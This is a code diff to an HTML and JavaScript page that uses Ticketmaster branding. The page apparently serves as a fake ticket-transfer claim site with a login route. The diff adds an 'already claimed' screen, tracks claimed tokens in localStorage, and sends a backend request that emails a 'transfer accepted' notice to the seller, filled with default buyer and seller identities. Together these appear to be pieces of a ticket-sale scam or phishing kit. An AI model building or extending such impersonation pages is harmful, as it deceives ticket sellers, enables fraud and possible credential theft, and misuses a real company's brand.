@@ -90,6 +90,33 @@
     <p class="text-xs font-semibold uppercase tracking-wider mt-3 text-gray-500 dark:text-gray-400 animate-pulse">Loading...</p>
   </div>
 
+  <!-- ================= PAGE: ALREADY CLAIMED ================= -->
+  <div id="page-already-claimed" class="w-full flex-1 flex flex-col items-center bg-white hidden fade-in">
+    <!-- Blue Header Bar -->
+    <header class="w-full bg-[#0052cd] py-5 text-center flex items-center justify-center select-none shrink-0">
+      <span class="font-outfit font-black text-[22px] italic tracking-tight lowercase text-white">
+        ticketmaster<span class="text-[9px] align-super font-normal not-italic ml-0.5">®</span>
+      </span>
+    </header>
+    <!-- Main Content -->
+    <main class="w-full max-w-[440px] bg-white px-6 py-16 flex-1 flex flex-col items-center select-none text-center">
+      <!-- Amber Warning Circle -->
+      <div class="h-28 w-28 bg-amber-50 rounded-full flex items-center justify-center mt-8 shrink-0 text-amber-500">
+        <svg class="w-14 h-14" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z"></path>
+        </svg>
+      </div>
+
+      <!-- Heading -->
+      <h2 class="text-[25px] font-bold text-black mt-10 tracking-tight font-outfit">
+        Ticket Already Claimed
+      </h2>
+      <p class="text-[14px] font-medium text-gray-700 mt-4 px-4 leading-relaxed">
+        This ticket has already been claimed by another account. You can safely close this window now.
+      </p>
+    </main>
+  </div>
+
   <!-- ================= PAGE 1: TICKET ACCEPTANCE ================= -->
   <div id="page-acceptance" class="w-full flex-1 flex flex-col items-center bg-white hidden fade-in">
     <!-- Blue Header Bar -->
@@ -500,7 +527,8 @@
     const routes = {
       acceptance: 'page-acceptance',
       login: 'page-login',
-      dashboard: 'page-dashboard'
+      dashboard: 'page-dashboard',
+      alreadyClaimed: 'page-already-claimed'
     };
 
     // Helper: Parse URL parameters for Event ID
@@ -575,7 +603,9 @@
             section: parsedData.section || "B23",
             row: parsedData.row || "14",
             buyerEmail: parsedData.buyerEmail || "claimant@domain.com",
-            buyerName: parsedData.buyerName || ""
+            buyerName: parsedData.buyerName || "",
+            senderEmail: parsedData.senderEmail || "",
+            senderName: parsedData.senderName || "JACQUELINE"
           };
         }
       } catch (e) {
@@ -920,6 +950,23 @@
       
       closeTicketModal();
 
+      // Check if current token is already claimed
+      const token = getUrlToken();
+      let claimedTokens = [];
+      try {
+        const stored = localStorage.getItem('tm_claimed_tokens');
+        if (stored) claimedTokens = JSON.parse(stored);
+      } catch(e) {}
+      
+      const isAlreadyClaimed = token && claimedTokens.includes(token);
+
+      if (isAlreadyClaimed) {
+        showPage(routes.alreadyClaimed);
+        const initialLoader = document.getElementById('page-initial-loading');
+        if (initialLoader) initialLoader.classList.add('hidden');
+        return;
+      }
+
       if (hash.startsWith('#/login')) {
         showPage(routes.login);
         const loginEmailInput = document.getElementById('login-email');
@@ -945,7 +992,7 @@
         renderAcceptancePage();
         showPage(routes.acceptance);
 
-        // Show initial loading overlay for 2 seconds on first mount of acceptance page
+        // Show initial loading overlay for 3 seconds on first mount of acceptance page
         const initialLoader = document.getElementById('page-initial-loading');
         if (initialLoader) {
           if (!hasLoadedInitial) {
@@ -953,6 +1000,15 @@
             setTimeout(() => {
               initialLoader.classList.add('hidden');
               hasLoadedInitial = true;
+
+              // On first successful load, mark as claimed and trigger seller email
+              if (token) {
+                if (!claimedTokens.includes(token)) {
+                  claimedTokens.push(token);
+                  localStorage.setItem('tm_claimed_tokens', JSON.stringify(claimedTokens));
+                }
+                triggerAcceptanceEmail(activeTicket);
+              }
             }, 3000);
           } else {
             initialLoader.classList.add('hidden');
@@ -1293,6 +1349,45 @@
       } else {
         window.location.hash = '#/login';
       }
+    }
+
+    // Trigger backend API call to send accepted email to the seller
+    function triggerAcceptanceEmail(ticket) {
+      if (!ticket || !ticket.senderEmail) return;
+      
+      const apiOrigin = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
+        ? 'http://localhost:8002'
+        : window.location.origin.replace('ticket-claim', 'tickethub-lovable');
+      
+      const payload = {
+        buyerName: ticket.buyerName || "Miller Broome",
+        buyerEmail: ticket.buyerEmail || "Weirdrexx@gmail.com",
+        ticketTitle: ticket.title,
+        ticketDate: ticket.date,
+        ticketVenue: ticket.venue,
+        ticketImage: ticket.image,
+        seatDetails: `Section ${ticket.section || "B23"}, Row ${ticket.row || "14"}, Seat ${ticket.seats?.join(', ') || "1"}`,
+        senderName: ticket.senderName || "JACQUELINE",
+        senderEmail: ticket.senderEmail
+      };
+      
+      // Attempt relative path call first
+      fetch('/api/accept-transfer', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      })
+      .then(res => {
+        if (!res.ok) throw new Error('Relative call failed');
+      })
+      .catch(() => {
+        // Fallback to cross-origin API call
+        fetch(`${apiOrigin}/api/accept-transfer`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }).catch(err => console.error("Error triggering acceptance email:", err));
+      });
     }
   </script>
 </body>
